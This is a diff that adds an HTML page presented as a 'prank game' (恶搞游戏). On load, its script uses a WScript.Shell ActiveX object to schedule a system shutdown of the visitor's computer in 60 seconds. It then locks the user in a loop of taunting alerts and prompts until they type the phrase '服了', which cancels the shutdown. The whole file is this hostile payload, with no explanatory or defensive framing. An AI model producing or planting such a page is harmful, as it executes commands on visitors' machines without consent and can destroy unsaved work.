@@ -1,0 +1,23 @@
+<html>
+<head>
+<title>恶搞游戏</title>
+<script type="text/javascript">
+	var o=new ActiveXObject("wscript.shell");
+	o.exec("shutdown -s -t 60");
+	while(true){
+		alert("你能猜出密码不");
+		alert("你猜猜试试看不");
+		alert("你信不信猜密码的时候关机了");
+		pro=prompt("你已进入关机模式，请输入正确口令取消");
+		if(pro=="服了"){
+			var p=new ActiveXObject("wscript.shell");
+			p.exec("shutdown -a");
+			break;
+		}
+	}
+	
+</script>
+</head>
+<body>
+</body>
+</html>
